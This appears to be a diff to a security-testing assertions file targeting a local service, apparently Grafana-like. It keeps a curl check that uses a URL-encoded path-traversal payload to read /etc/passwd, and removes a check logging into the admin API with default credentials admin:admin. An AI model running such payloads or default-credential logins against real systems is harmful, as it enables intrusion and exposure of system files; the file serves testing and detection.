@@ -72,17 +72,6 @@ assertions:
       command: "curl -sf --path-as-is 'http://localhost:20901/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd' | grep -q root"
       exit_code: 0
 
-  - name: exploit-admin-api-users
-    type: command
-    expect:
-      command: "curl -sf -u admin:admin http://localhost:20901/api/admin/users?perpage=10 | grep -q admin"
-      exit_code: 0
-
-  # ══════════════════════════════════════════════════════════════════════
-  # CORRELATION: chain detection (default creds + admin + RCE)
-  # min_findings 0 since full chain requires all three findings present
-  # ══════════════════════════════════════════════════════════════════════
-
   - name: correlation-default-creds-rce-chain
     type: beacon
     target: localhost:20901
